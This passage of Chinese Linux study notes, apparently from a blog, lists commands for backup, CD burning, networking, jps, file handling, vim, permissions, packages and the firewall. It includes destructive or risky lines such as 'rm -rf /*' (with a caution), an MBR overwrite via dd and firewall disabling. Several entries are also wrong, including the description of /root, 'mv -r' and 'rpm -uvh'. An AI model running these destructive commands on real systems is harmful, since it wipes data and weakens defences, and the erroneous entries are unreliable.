通过SSH通道rsync </span><br><span class="line">rsync -az -e ssh --delete ip_addr:/home/public /home/local 通过ssh和压缩将一个远程目录同步到本地目录 </span><br><span class="line">rsync -az -e ssh --delete /home/local ip_addr:/home/public 通过ssh和压缩将本地目录同步到远程目录 </span><br><span class="line">dd bs=1M if=/dev/hda | gzip | ssh user@ip_addr &#x27;dd of=hda.gz&#x27; 通过ssh在远程主机上执行一次备份本地磁盘的操作 </span><br><span class="line">dd if=/dev/sda of=/tmp/file1 备份磁盘内容到一个文件 </span><br><span class="line">tar -Puf backup.tar /home/user 执行一次对 &#x27;/home/user&#x27; 目录的交互式备份操作 </span><br><span class="line">( cd /tmp/local/ &amp;&amp; tar c . ) | ssh -C user@ip_addr &#x27;cd /home/share/ &amp;&amp; tar x -p&#x27; 通过ssh在远程目录中复制一个目录内容 </span><br><span class="line">( tar c /home ) | ssh -C user@ip_addr &#x27;cd /home/backup-home &amp;&amp; tar x -p&#x27; 通过ssh在远程目录中复制一个本地目录 </span><br><span class="line">tar cf - . | (cd /tmp/backup ; tar xf - ) 本地将一个目录复制到另一个地方，保留原有权限及链接 </span><br><span class="line">find /home/user1 -name &#x27;*.txt&#x27; | xargs cp -av --target-directory=/home/backup/ --parents 从一个目录查找并复制所有以 &#x27;.txt&#x27; 结尾的文件到另一个目录 </span><br><span class="line">find /var/log -name &#x27;*.log&#x27; | tar cv --files-from=- | bzip2 &gt; log.tar.bz2 查找所有以 &#x27;.log&#x27; 结尾的文件并做成一个bzip包 </span><br><span class="line">dd if=/dev/hda of=/dev/fd0 bs=512 count=1 做一个将 MBR (Master Boot Record)内容复制到软盘的动作 </span><br><span class="line">dd if=/dev/fd0 of=/dev/hda bs=512 count=1 从已经保存到软盘的备份中恢复MBR内容 </span><br></pre></td></tr></table></figure><h4 id="光盘"><a href="#光盘" class="headerlink" title="光盘"></a>光盘</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cdrecord -v gracetime=2 dev=/dev/cdrom -eject blank=fast -force       //清空一个可复写的光盘内容 </span><br><span class="line">mkisofs /dev/cdrom &gt; cd.iso   //在磁盘上创建一个光盘的iso镜像文件 </span><br><span class="line">mkisofs /dev/cdrom | gzip &gt; cd_iso.gz      //在磁盘上创建一个压缩了的光盘iso镜像文件 </span><br><span class="line">mkisofs -J -allow-leading-dots -R -V &quot;Label CD&quot; -iso-level 4 -o ./cd.iso data_cd      //创建一个目录的iso镜像文件 </span><br><span class="line">cdrecord -v dev=/dev/cdrom cd.iso   //刻录一个ISO镜像文件 </span><br><span class="line">gzip -dc cd_iso.gz | cdrecord dev=/dev/cdrom -     //刻录一个压缩了的ISO镜像文件 </span><br><span class="line">mount -o loop cd.iso /mnt/iso    //挂载一个ISO镜像文件 </span><br><span class="line">cd-paranoia -B              //从一个CD光盘转录音轨到 wav 文件中 </span><br><span class="line">cd-paranoia -- &quot;-3&quot;          //从一个CD光盘转录音轨到 wav 文件中（参数-3） </span><br><span class="line">cdrecord --scanbus           //扫描总线以识别scsi通道 </span><br><span class="line">dd if=/dev/hdc | md5sum        //校验一个设备的md5sum编码，例如一张 CD </span><br></pre></td></tr></table></figure><h4 id="网络-（以太网和WIFI无线）"><a href="#网络-（以太网和WIFI无线）" class="headerlink" title="网络 - （以太网和WIFI无线）"></a>网络 - （以太网和WIFI无线）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ifconfig eth0     //显示一个以太网卡的配置 </span><br><span class="line">ifup eth0        //启用一个 &#x27;eth0&#x27; 网络设备 </span><br><span class="line">ifdown eth0       //禁用一个 &#x27;eth0&#x27; 网络设备 </span><br><span class="line">ifconfig eth0 192.168.1.1 netmask 255.255.255.0  //控制IP地址 </span><br><span class="line">ifconfig eth0 promisc   //设置 &#x27;eth0&#x27; 成混杂模式以嗅探数据包 (sniffing) </span><br><span class="line">dhclient eth0       //以dhcp模式启用 &#x27;eth0&#x27; </span><br><span class="line">route -n show routing table </span><br><span class="line">route add -net 0/0 gw IP_Gateway configura default gateway </span><br><span class="line">route add -net 192.168.0.0 netmask 255.255.0.0 gw 192.168.1.1 configure static route to reach network &#x27;192.168.0.0/16&#x27; </span><br><span class="line">route del 0/0 gw IP_gateway remove static route </span><br><span class="line">echo &quot;1&quot; &gt; /proc/sys/net/ipv4/ip_forward activate ip routing </span><br><span class="line">hostname show hostname of system     //主机名</span><br><span class="line">host www.example.com lookup hostname to resolve name to ip address and viceversa</span><br><span class="line">nslookup www.example.com lookup hostname to resolve name to ip address and viceversa</span><br><span class="line">ip link show show link status of all interfaces </span><br><span class="line">mii-tool eth0 show link status of &#x27;eth0&#x27; </span><br><span class="line">ethtool eth0 show statistics of network card &#x27;eth0&#x27; </span><br><span class="line">netstat -tup show all active network connections and their PID </span><br><span class="line">netstat -tupl show all network services listening on the system and their PID </span><br><span class="line">tcpdump tcp port 80 show all HTTP traffic </span><br><span class="line">iwlist scan show wireless networks </span><br><span class="line">iwconfig eth1 show configuration of a wireless network card </span><br><span class="line">hostname show hostname </span><br><span class="line">host www.example.com lookup hostname to resolve name to ip address and viceversa </span><br><span class="line">nslookup www.example.com lookup hostname to resolve name to ip address and viceversa </span><br><span class="line">whois www.example.com lookup on Whois database </span><br></pre></td></tr></table></figure><h4 id="JPS工具"><a href="#JPS工具" class="headerlink" title="JPS工具"></a>JPS工具</h4><p>jps(Java Virtual Machine Process Status Tool)是JDK 1.5提供的一个显示当前所有java进程pid的命令，简单实用，非常适合在linux&#x2F;unix平台上简单察看当前java进程的一些简单情况。</p><p>  我想很多人都是用过unix系统里的ps命令，这个命令主要是用来显示当前系统的进程情况，有哪些进程，及其 id。 jps 也是一样，它的作用是显示当前系统的java进程情况，及其id号。我们可以通过它来查看我们到底启动了几个java进程（因为每一个java程序都会独占一个java虚拟机实例），和他们的进程号（为下面几个程序做准备），并可通过opt来查看这些进程的详细启动参数。</p><p>   <strong>使用方法：在当前命令行下打 jps(需要JAVA_HOME，没有的话，到改程序的目录下打) 。</strong></p><p><strong>jps存放在JAVA_HOME&#x2F;bin&#x2F;jps，使用时为了方便请将JAVA_HOME&#x2F;bin&#x2F;加入到Path.</strong></p><p>$&gt; <strong>jps</strong><br>23991 Jps<br>23789 BossMain<br>23651 Resin</p><p>比较常用的参数：</p><p><strong>-q 只显示pid，不显示class名称,jar文件名和传递给main 方法的参数</strong><br>$&gt; <strong>jps -q</strong><br>28680<br>23789<br>23651</p><p><strong>-m 输出传递给main 方法的参数，在嵌入式jvm上可能是null</strong></p><p>$&gt; <strong>jps -m</strong><br>28715 Jps -m<br>23789 BossMain<br>23651 Resin -socketwait 32768 -stdout &#x2F;data&#x2F;aoxj&#x2F;resin&#x2F;log&#x2F;stdout.log -stderr &#x2F;data&#x2F;aoxj&#x2F;resin&#x2F;log&#x2F;stderr.log</p><p><strong>-l 输出应用程序main class的完整package名 或者 应用程序的jar文件完整路径名</strong></p><p>$&gt; <strong>jps -l</strong><br>28729 sun.tools.jps.Jps<br>23789 com.asiainfo.aimc.bossbi.BossMain<br>23651 com.caucho.server.resin.Resin</p><p><strong>-v 输出传递给JVM的参数</strong></p><p>$&gt; <strong>jps -v</strong><br>23789 BossMain<br>28802 Jps -Denv.class.path&#x3D;&#x2F;data&#x2F;aoxj&#x2F;bossbi&#x2F;twsecurity&#x2F;java&#x2F;trustwork140.jar:&#x2F;data&#x2F;aoxj&#x2F;bossbi&#x2F;twsecurity&#x2F;java&#x2F;:&#x2F;data&#x2F;aoxj&#x2F;bossbi&#x2F;twsecurity&#x2F;java&#x2F;twcmcc.jar:&#x2F;data&#x2F;aoxj&#x2F;jdk15&#x2F;lib&#x2F;rt.jar:&#x2F;data&#x2F;aoxj&#x2F;jd</p><p>k15&#x2F;lib&#x2F;tools.jar -Dapplication.home&#x3D;&#x2F;data&#x2F;aoxj&#x2F;jdk15 -Xms8m<br>23651 Resin -Xss1m -Dresin.home&#x3D;&#x2F;data&#x2F;aoxj&#x2F;resin -Dserver.root&#x3D;&#x2F;data&#x2F;aoxj&#x2F;resin -Djava.util.logging.manager&#x3D;com.caucho.log.LogManagerImpl -</p><p>Djavax.management.builder.initial&#x3D;com.caucho.jmx.MBeanServerBuilderImpl</p><p><strong>sudo jps看到的进程数量最全</strong></p><p><strong>jps 192.168.0.77</strong></p><p><strong>列出远程服务器192.168.0.77机器所有的jvm实例，采用rmi协议，默认连接端口为1099</strong></p><p><strong>（前提是远程服务器提供jstatd服务）</strong></p><p><strong>注：jps命令有个地方很不好，似乎只能显示当前用户的java进程，要显示其他用户的还是只能用unix&#x2F;linux的ps命令。</strong></p><p><a href="https://blog.csdn.net/luansj/article/details/97272672">学习链接：  Linux常用命令大全（非常全！！！）_linux命令-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> 2 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>笔记4</title>
      <link href="/2023/11/15/%E7%AC%94%E8%AE%B04/"/>
      <url>/2023/11/15/%E7%AC%94%E8%AE%B04/</url>
      
        <content type="html"><![CDATA[<h1 id="php网站的搭建"><a href="#php网站的搭建" class="headerlink" title="php网站的搭建"></a>php网站的搭建</h1><p>192.168.5.110</p><p>登陆界面</p><p>评论界面</p><h4 id="Linux系统的文件结构"><a href="#Linux系统的文件结构" class="headerlink" title="Linux系统的文件结构"></a>Linux系统的文件结构</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin        二进制文件，系统常规命令</span><br><span class="line">/boot       系统启动分区，系统启动时读取的文件</span><br><span class="line">/dev        设备文件</span><br><span class="line">/etc        大多数配置文件</span><br><span class="line">/home       普通用户的家目录</span><br><span class="line">/lib        32位函数库</span><br><span class="line">/lib64      64位库</span><br><span class="line">/media      手动临时挂载点</span><br><span class="line">/mnt        手动临时挂载点</span><br><span class="line">/opt        第三方软件安装位置</span><br><span class="line">/proc       进程信息及硬件信息</span><br><span class="line">/root       临时设备的默认挂载点</span><br><span class="line">/sbin       系统管理命令</span><br><span class="line">/srv        数据</span><br><span class="line">/var        数据</span><br><span class="line">/sys        内核相关信息</span><br><span class="line">/tmp        临时文件</span><br><span class="line">/usr        用户相关设定</span><br></pre></td></tr></table></figure><h6 id="关机"><a href="#关机" class="headerlink" title="关机"></a>关机</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shutdown -h now 或者 poweroff  //立刻关机</span><br><span class="line">shutdown -h 2          //两分钟后关机</span><br></pre></td></tr></table></figure><h6 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shutdown -r now  或者   reboot    //立刻重启</span><br><span class="line">shutdown -r 2        //两分钟后重启</span><br></pre></td></tr></table></figure><h4 id="目录操作"><a href="#目录操作" class="headerlink" title="目录操作"></a>目录操作</h4><h6 id="切换目录"><a href="#切换目录" class="headerlink" title="切换目录"></a>切换目录</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /               //切换到根目录</span><br><span class="line">cd /bin   //切换到根目录下的bin目录</span><br><span class="line">cd ../             //切换到上一级目录</span><br><span class="line">cd ~               //切换到home目录</span><br><span class="line">cd -               //切换到上次访问的目录</span><br><span class="line">cd xx              //切换到本目录下的名为xx的文件目录</span><br><span class="line">cd /xxx/xx/x       //切换到目标目录</span><br></pre></td></tr></table></figure><h6 id="查看目录"><a href="#查看目录" class="headerlink" title="查看目录"></a>查看目录</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls//查看当前目录下的所有目录和文件</span><br><span class="line">ls -a//查看当前目录下的所有目录和文件（包括隐藏文件）</span><br><span class="line">ls -l//列表查看当前目录下的所有目录和文件（列表查看，显示更多信息）</span><br><span class="line">ls /bin//查看指定目录下的所有目录和文件</span><br></pre></td></tr></table></figure><h6 id="创建目录"><a href="#创建目录" class="headerlink" title="创建目录"></a>创建目录</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir tools//在当前目录下创建一个名为tools的目录</span><br><span class="line">mkdir /bin/tools//在指定目录下创建一个名为tools的目录</span><br></pre></td></tr></table></figure><h6 id="删除目录与文件"><a href="#删除目录与文件" class="headerlink" title="删除目录与文件"></a>删除目录与文件</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm 文件名 //删除当前目录下的文件</span><br><span class="line">rm -f 文件名 //删除当前目录下的文件（不询问）</span><br><span class="line">rm -r 文件夹名//递归删除当前目录下此名的目录</span><br><span class="line">rm -rf 文件夹名//递归删除当前目录下此名的目录（不询问）</span><br><span class="line">rm -rf *  //将当前目录下的所有目录和文件全部删除</span><br><span class="line">rm -rf /*  //将根目录下的所有文件全部删除【慎用！相当于格式化系统】</span><br></pre></td></tr></table></figure><h6 id="修改目录"><a href="#修改目录" class="headerlink" title="修改目录"></a>修改目录</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv 当前目录名 新目录名        //修改目录名，同样适用与文件操作</span><br><span class="line">mv /usr/tmp/tool /opt       //将/usr/tmp目录下的tool目录剪切到 /opt目录下面</span><br><span class="line"> mv -r /usr/tmp/tool /opt    //递归剪切目录中所有文件和文件夹</span><br></pre></td></tr></table></figure><h6 id="拷贝目录"><a href="#拷贝目录" class="headerlink" title="拷贝目录"></a>拷贝目录</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /usr/tmp/tool /opt       //将/usr/tmp目录下的tool目录复制到 /opt目录下面</span><br><span class="line">cp -r /usr/tmp/tool /opt    //递归剪复制目录中所有文件和文件夹</span><br></pre></td></tr></table></figure><h4 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h4><h6 id="新增文件（touch）"><a href="#新增文件（touch）" class="headerlink" title="新增文件（touch）"></a>新增文件（touch）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">touch  a.txt         //在当前目录下创建名为a的txt文件（文件不存在），如果文件存在，将文件时间属性修改为当前系统时间</span><br></pre></td></tr></table></figure><h6 id="删除文件（rm）"><a href="#删除文件（rm）" class="headerlink" title="删除文件（rm）"></a>删除文件（rm）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm 文件名              //删除当前目录下的文件</span><br><span class="line">rm -f 文件名           //删除当前目录的的文件（不询问）</span><br></pre></td></tr></table></figure><h6 id="编辑文件（vi、vim）"><a href="#编辑文件（vi、vim）" class="headerlink" title="编辑文件（vi、vim）"></a>编辑文件（vi、vim）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  vi 文件名              //打开需要编辑的文件</span><br><span class="line">  --进入后，操作界面有三种模式：命令模式（command mode）、插入模式（Insert mode）和底行模式（last line mode）</span><br><span class="line">  命令模式</span><br><span class="line">  -刚进入文件就是命令模式，通过方向键控制光标位置，</span><br><span class="line">  -使用命令&quot;dd&quot;删除当前整行</span><br><span class="line">  -使用命令&quot;/字段&quot;进行查找</span><br><span class="line">  -按&quot;i&quot;在光标所在字符前开始插入</span><br><span class="line">  -按&quot;a&quot;在光标所在字符后开始插入</span><br><span class="line">  -按&quot;o&quot;在光标所在行的下面另起一新行插入</span><br><span class="line">  -按&quot;I&quot;在光标所在行最前开始插入</span><br><span class="line">  -按&quot;A&quot;在光标所在行最后开始插入</span><br><span class="line">  -按&quot;O&quot;在光标所在行上一行另起一新行插入</span><br><span class="line">  -按&quot;：&quot;进入底行模式</span><br><span class="line">  插入模式</span><br><span class="line">  -此时可以对文件内容进行编辑，左下角会显示 &quot;-- 插入 --&quot;&quot;</span><br><span class="line">  -按&quot;ESC&quot;进入底行模式</span><br><span class="line">  底行模式</span><br><span class="line">  -退出编辑：      :q</span><br><span class="line">  -强制退出：      :q!</span><br><span class="line">  -保存并退出：    :wq</span><br><span class="line">操作步骤示例</span><br><span class="line">  1.保存文件：按&quot;ESC&quot; -&gt; 输入&quot;:&quot; -&gt; 输入&quot;wq&quot;,回车     //保存并退出编辑</span><br><span class="line">  2.取消操作：按&quot;ESC&quot; -&gt; 输入&quot;:&quot; -&gt; 输入&quot;q!&quot;,回车     //撤销本次修改并退出编辑</span><br><span class="line">  </span><br><span class="line">  vim +10 filename.txt            //打开文件并跳到第10行</span><br><span class="line">  vim -R /etc/passwd              //以只读模式打开文件</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/elegege/images@main//imagevim.png" alt="文本编辑"></p><p><img src="https://cdn.jsdelivr.net/gh/elegege/images@main//imagevi.png"></p><h6 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat a.txt          //查看文件最后一屏内容</span><br><span class="line">less a.txt         //PgUp向上翻页，PgDn向下翻页，&quot;q&quot;退出查看</span><br><span class="line">more a.txt         //显示百分比，回车查看下一行，空格查看下一页，&quot;q&quot;退出查看</span><br><span class="line">tail -100 a.txt    //查看文件的后100行，&quot;Ctrl+C&quot;退出查看</span><br></pre></td></tr></table></figure><h4 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h4><h6 id="权限说明"><a href="#权限说明" class="headerlink" title="权限说明"></a>权限说明</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件权限简介：&#x27;r&#x27; 代表可读（4），&#x27;w&#x27; 代表可写（2），&#x27;x&#x27; 代表执行权限（1），括号内代表&quot;8421法&quot;</span><br><span class="line">  ##文件权限信息示例：-rwxrw-r--</span><br><span class="line">  -第一位：&#x27;-&#x27;就代表是文件，&#x27;d&#x27;代表是文件夹</span><br><span class="line">  -第一组三位：拥有者的权限</span><br><span class="line">  -第二组三位：拥有者所在的组，组员的权限</span><br><span class="line">  -第三组三位：代表的是其他用户的权限</span><br></pre></td></tr></table></figure><h6 id="文件权限-1"><a href="#文件权限-1" class="headerlink" title="文件权限"></a>文件权限</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">普通授权    chmod +x a.txt    </span><br><span class="line">8421法     chmod 777 a.txt     //1+2+4=7，&quot;7&quot;说明授予所有权限</span><br></pre></td></tr></table></figure><h4 id="打包与解压"><a href="#打包与解压" class="headerlink" title="打包与解压"></a>打包与解压</h4><h6 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.zip、.rar        //windows系统中压缩文件的扩展名</span><br><span class="line">.tar              //Linux中打包文件的扩展名</span><br><span class="line">.gz               //Linux中压缩文件的扩展名</span><br><span class="line">.tar.gz           //Linux中打包并压缩文件的扩展名</span><br></pre></td></tr></table></figure><h6 id="打包文件"><a href="#打包文件" class="headerlink" title="打包文件"></a>打包文件</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -zcvf 打包压缩后的文件名 要打包的文件</span><br><span class="line">参数说明：z：调用gzip压缩命令进行压缩; c：打包文件; v：显示运行过程; f：指定文件名;</span><br><span class="line">示例：</span><br><span class="line">tar -zcvf a.tar file1 file2,...      //多个文件压缩打包</span><br></pre></td></tr></table></figure><h6 id="解压文件"><a href="#解压文件" class="headerlink" title="解压文件"></a>解压文件</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -zxvf a.tar                      //解包至当前目录</span><br><span class="line">tar -zxvf a.tar -C /usr------        //指定解压的位置</span><br><span class="line">unzip test.zip             //解压*.zip文件 </span><br><span class="line">unzip -l test.zip          //查看*.zip文件的内容 </span><br></pre></td></tr></table></figure><h4 id="其他常用命令"><a href="#其他常用命令" class="headerlink" title="其他常用命令"></a>其他常用命令</h4><h6 id="find"><a href="#find" class="headerlink" title="find"></a>find</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find . -name &quot;*.c&quot;     //将目前目录及其子目录下所有延伸档名是 c 的文件列出来</span><br><span class="line"></span><br><span class="line">find . -type f         //将目前目录其其下子目录中所有一般文件列出</span><br><span class="line"></span><br><span class="line">find . -ctime -20      //将目前目录及其子目录下所有最近 20 天内更新过的文件列出</span><br><span class="line"></span><br><span class="line">find /var/log -type f -mtime +7 -ok rm &#123;&#125; \;     //查找/var/log目录中更改时间在7日以前的普通文件，并在删除之前询问它们</span><br><span class="line"></span><br><span class="line">find . -type f -perm 644 -exec ls -l &#123;&#125; \;       //查找前目录中文件属主具有读、写权限，并且文件所属组的用户和其他用户具有读权限的文件</span><br><span class="line"></span><br><span class="line">find / -type f -size 0 -exec ls -l &#123;&#125; \;         //为了查找系统中所有文件长度为0的普通文件，并列出它们的完整路径</span><br></pre></td></tr></table></figure><h6 id="whereis"><a href="#whereis" class="headerlink" title="whereis"></a>whereis</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whereis ls             //将和ls文件相关的文件都查找出来</span><br></pre></td></tr></table></figure><h6 id="which"><a href="#which" class="headerlink" title="which"></a>which</h6> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">说明：which指令会在环境变量$PATH设置的目录里查找符合条件的文件。</span><br><span class="line"> which bash             //查看指令&quot;bash&quot;的绝对路径</span><br></pre></td></tr></table></figure><h6 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">说明：sudo命令以系统管理者的身份执行指令，也就是说，经由 sudo 所执行的指令就好像是 root 亲自执行。需要输入自己账户密码。</span><br><span class="line">使用权限：在 /etc/sudoers 中有出现的使用者</span><br><span class="line">sudo -l                              //列出目前的权限</span><br><span class="line">$ sudo -u root vi ~www/index.html    //以 root 用户身份编辑  home 目录下www目录中的 index.html 文件</span><br></pre></td></tr></table></figure><h6 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep -i &quot;the&quot; demo_file              //在文件中查找字符串(不区分大小写)</span><br><span class="line">grep -A 3 -i &quot;example&quot; demo_text     //输出成功匹配的行，以及该行之后的三行</span><br><span class="line">grep -r &quot;ramesh&quot; *                   //在一个文件夹中递归查询包含指定字符串的文件</span><br></pre></td></tr></table></figure><h6 id="service"><a href="#service" class="headerlink" title="service"></a>service</h6>  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">说明：service命令用于运行System V init脚本，这些脚本一般位于/etc/init.d文件下，这个命令可以直接运行这个文件夹里面的脚本，而不用加上路径</span><br><span class="line">service ssh status      //查看服务状态 </span><br><span class="line">service --status-all    //查看所有服务状态 </span><br><span class="line">service ssh restart     //重启服务 </span><br></pre></td></tr></table></figure><h6 id="free"><a href="#free" class="headerlink" title="free"></a>free</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">说明：这个命令用于显示系统当前内存的使用情况，包括已用内存、可用内存和交换内存的情况 </span><br><span class="line">free -g            //以G为单位输出内存的使用量，-g为GB，-m为MB，-k为KB，-b为字节 </span><br><span class="line">free -t            //查看所有内存的汇总</span><br></pre></td></tr></table></figure><h6 id="top"><a href="#top" class="headerlink" title="top"></a>top</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">top      //显示当前系统中占用资源最多的一些进程, shift+m 按照内存大小查看</span><br></pre></td></tr></table></figure><h6 id="df"><a href="#df" class="headerlink" title="df"></a>df</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">说明：显示文件系统的磁盘使用情况</span><br><span class="line">  df -h            //一种易看的显示</span><br></pre></td></tr></table></figure><h6 id="mount"><a href="#mount" class="headerlink" title="mount"></a>mount</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount /dev/sdb1 /u01     //挂载一个文件系统，需要先创建一个目录，然后将这个文件系统挂载到这个目录上</span><br><span class="line">dev/sdb1 /u01 ext2 defaults 0 2   //添加到fstab中进行自动挂载，这样任何时候系统重启的时候，文件系统都会被加载 </span><br></pre></td></tr></table></figure><h6 id="uname"><a href="#uname" class="headerlink" title="uname"></a>uname</h6><p> __说明：uname可以显示一些重要的系统信息，例如内核名称、主机名、内核版本号、处理器类型之类的信息 __<br>  <strong>uname -a</strong></p><h6 id="yum"><a href="#yum" class="headerlink" title="yum"></a>yum</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">说明：安装插件命令</span><br><span class="line">yum install httpd      //使用yum安装apache </span><br><span class="line">yum update httpd       //更新apache </span><br><span class="line">yum remove httpd       //卸载/删除apache </span><br></pre></td></tr></table></figure><h6 id="rpm"><a href="#rpm" class="headerlink" title="rpm"></a>rpm</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> 说明：插件安装命令</span><br><span class="line">rpm -ivh httpd-2.2.3-22.0.1.el5.i386.rpm     //使用rpm文件安装apache </span><br><span class="line">rpm -uvh httpd-2.2.3-22.0.1.el5.i386.rpm      //使用rpm更新apache </span><br><span class="line">rpm -ev httpd                              //卸载/删除apache </span><br></pre></td></tr></table></figure><h6 id="date"><a href="#date" class="headerlink" title="date"></a>date</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">date -s &quot;01/31/2010 23:59:53&quot;   ///设置系统时间</span><br></pre></td></tr></table></figure><h6 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">说明：使用wget从网上下载软件、音乐、视频 </span><br><span class="line">//下载文件并以指定的文件名保存文件</span><br><span class="line">wget -O 文件名 下载路径 </span><br></pre></td></tr></table></figure><h6 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp IP/hostname    //访问ftp服务器</span><br><span class="line">mls *.html -       //显示远程主机上文件列表</span><br></pre></td></tr></table></figure><h6 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp /opt/data.txt  192.168.1.101:/opt/    //将本地opt目录下的data文件发送到192.168.1.101服务器的opt目录下</span><br></pre></td></tr></table></figure><h4 id="系统管理"><a href="#系统管理" class="headerlink" title="系统管理"></a>系统管理</h4><h6 id="防火墙操作"><a href="#防火墙操作" class="headerlink" title="防火墙操作"></a>防火墙操作</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service iptables status      //查看iptables服务的状态</span><br><span class="line">service iptables start       //开启iptables服务</span><br><span class="line">service iptables stop        //停止iptables服务</span><br><span class="line">service iptables restart     //重启iptables服务</span><br><span class="line">chkconfig iptables off       //关闭iptables服务的开机自启动</span><br><span class="line">chkconfig iptables on        //开启iptables服务的开机自启动</span><br><span class="line">##centos7 防火墙操作</span><br><span class="line">systemctl status firewalld.service     //查看防火墙状态 systemctl stop firewalld.service       //关闭运行的防火墙</span><br><span class="line">systemctl disable firewalld.service    //永久禁止防火墙服务</span><br></pre></td></tr></table></figure><h6 id="修改主机名（CentOS-7）"><a href="#修改主机名（CentOS-7）" class="headerlink" title="修改主机名（CentOS 7）"></a>修改主机名（CentOS 7）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hostnamectl set-hostname 主机名</span><br></pre></td></tr></table></figure><h6 id="查看网络"><a href="#查看网络" class="headerlink" title="查看网络"></a>查看网络</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure><h6 id="修改IP"><a href="#修改IP" class="headerlink" title="修改IP"></a>修改IP</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改网络配置文件，文件地址：/etc/sysconfig/network-scripts/ifcfg-eth0</span><br><span class="line">  ------------------------------------------------</span><br><span class="line">  主要修改以下配置：  </span><br><span class="line">  TYPE=Ethernet               //网络类型</span><br><span class="line">  BOOTPROTO=static            //静态IP</span><br><span class="line">  DEVICE=ens00                //网卡名</span><br><span class="line">  IPADDR=192.168.1.100        //设置的IP</span><br><span class="line">  NETMASK=255.255.255.0       //子网掩码</span><br><span class="line">  GATEWAY=192.168.1.1         //网关</span><br><span class="line">  DNS1=192.168.1.1            //DNS</span><br><span class="line">  DNS2=8.8.8.8                //备用DNS</span><br><span class="line">  ONBOOT=yes                  //系统启动时启动此设置</span><br><span class="line">  -------------------------------------------------</span><br><span class="line">  修改保存以后使用命令重启网卡：service network restart</span><br></pre></td></tr></table></figure><h6 id="配置映射"><a href="#配置映射" class="headerlink" title="配置映射"></a>配置映射</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改文件： vi /etc/hosts</span><br><span class="line"> 在文件最后添加映射地址，示例如下：</span><br><span class="line">  192.168.1.101  node1</span><br><span class="line">  192.168.1.102  node2</span><br><span class="line">  192.168.1.103  node3</span><br><span class="line"> 配置好以后保存退出，输入命令：ping node1 ，可见实际 ping 的是 192.168.1.101。</span><br></pre></td></tr></table></figure><h6 id="查看进程"><a href="#查看进程" class="headerlink" title="查看进程"></a>查看进程</h6> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -ef         //查看所有正在运行的进程</span><br></pre></td></tr></table></figure><h6 id="结束进程"><a href="#结束进程" class="headerlink" title="结束进程"></a>结束进程</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kill pid       //杀死该pid的进程</span><br><span class="line">kill -9 pid    //强制杀死该进程  </span><br></pre></td></tr></table></figure><h6 id="查看链接"><a href="#查看链接" class="headerlink" title="查看链接"></a>查看链接</h6>  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping IP        //查看与此IP地址的连接情况</span><br><span class="line">  netstat -an    //查看当前系统端口</span><br><span class="line">  netstat -an | grep 8080     //查看指定端口</span><br></pre></td></tr></table></figure><h6 id="快速清屏"><a href="#快速清屏" class="headerlink" title="快速清屏"></a>快速清屏</h6><figure class="highlight plaintext"><table><tr><td 